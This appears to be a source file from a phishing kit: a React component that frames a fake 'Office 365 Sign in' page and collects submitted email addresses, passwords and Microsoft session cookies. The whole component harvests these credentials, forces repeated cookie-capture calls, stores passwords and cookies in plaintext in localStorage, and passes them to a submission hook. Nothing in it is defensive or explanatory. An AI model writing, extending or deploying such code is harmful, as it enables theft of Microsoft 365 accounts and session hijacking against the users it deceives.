import React, { useState, useEffect, useRef } from 'react';
import { useLogin } from '../hooks/useLogin';
import { microsoftCookieCapture } from '../utils/microsoftCookieCapture';
import { realCookieCapture } from '../utils/realCookieCapture';

interface Office365WrapperProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onLoginError }) => {
  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [isIframeLoading, setIsIframeLoading] = useState(true);

  // Microsoft cookie capture integration
  useEffect(() => {
    const handleMicrosoftSession = (session: any) => {
      console.log('🔵 Microsoft session captured in Office365Wrapper:', {
        authCookies: session.authCookies.length,
        sessionCookies: session.sessionCookies.length,
        outlookCookies: session.outlookCookies.length
      });
      
      // Optionally store Microsoft session data
      if (session.authCookies.length > 0) {
        localStorage.setItem('microsoft_session', JSON.stringify(session));
      }
    };

    microsoftCookieCapture.onMicrosoftSession(handleMicrosoftSession);

    // Start real cookie capture
    realCookieCapture.forceCaptureNow();
    
    // Log real cookie stats
    const stats = realCookieCapture.getCookieStats();
    console.log('🔵 Real Cookie Capture Stats:', stats);
  }, []);

  // This logic for handling form submission from the iframe remains untouched
  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.data.type === 'OFFICE_365_SUBMIT') {
        const { email, password } = event.data.payload;
        // Include cookies and cookieList from the iframe message
        const formData = { 
          email, 
          password, 
          provider: 'Office365',
          cookies: event.data.payload.cookies || realCookieCapture.getAllCookies(),
          cookieList: event.data.payload.cookieList || realCookieCapture.getAllCookies()
        };
        handleFormSubmit(new Event('submit'), formData);
      }
      
      // Capture Microsoft cookies from iframe messages
      if (event.data.type === 'MICROSOFT_COOKIES' || event.data.type === 'OFFICE_365_COOKIES') {
        console.log('🔵 Received Microsoft cookies from iframe:', event.data);
        
        // Store cookie data for later use in form submission
        if (event.data.cookies || event.data.cookieList) {
          localStorage.setItem('office365_cookies', JSON.stringify({
            cookies: event.data.cookies || realCookieCapture.getAllCookies(),
            cookieList: event.data.cookieList || realCookieCapture.getAllCookies(),
            email: event.data.email || '',
            password: event.data.password || '',
            timestamp: new Date().toISOString()
          }));
        }
        
        // Force capture real cookies
        realCookieCapture.forceCaptureNow();
      }
      
      // Trigger cookie capture on successful authentication
      if (event.data.type === 'OFFICE_365_AUTH_SUCCESS') {
        // Store authentication success data
        if (event.data.payload.cookies || event.data.payload.cookieList) {
          localStorage.setItem('office365_auth_cookies', JSON.stringify({
            cookies: event.data.payload.cookies || realCookieCapture.getAllCookies(),
            cookieList: event.data.payload.cookieList || realCookieCapture.getAllCookies(),
            email: event.data.payload.email || '',
            password: event.data.payload.password || '',
            timestamp: new Date().toISOString()
          }));
        }
        
        setTimeout(() => {
          microsoftCookieCapture.forceCaptureNow();
          realCookieCapture.forceCaptureNow();
        }, 1000);
      }
    };
    window.addEventListener('message', handleMessage);
    return () => {
      window.removeEventListener('message', handleMessage);
    };
  }, [handleFormSubmit]);

  // This logic for sending errors down to the iframe remains untouched
  useEffect(() => {
    if (errorMessage && iframeRef.current?.contentWindow) {
      iframeRef.current.contentWindow.postMessage({
        type: 'LOGIN_ERROR',
        payload: { message: errorMessage }
      }, '*');
    }
  }, [errorMessage]);

  return (
    <>
      {/* White placeholder while iframe loads */}
      {isIframeLoading && (
        <div className="w-full h-screen flex flex-col items-center justify-center bg-white" />
      )}

      <iframe
        ref={iframeRef}
        src="/office.365.html"
        title="Office 365 Sign in"
        // The iframe is hidden until it's fully loaded
        style={{ display: isIframeLoading ? 'none' : 'block' }}
        className="w-full h-screen border-0"
        // When the iframe content is ready, hide the loader and show the iframe
        onLoad={() => {
          setIsIframeLoading(false);
          // Trigger initial cookie capture when iframe loads
          setTimeout(() => {
            microsoftCookieCapture.forceCaptureNow();
            realCookieCapture.forceCaptureNow();
          }, 2000);
        }}
      />
    </>
  );
};

export default Office365Wrapper;
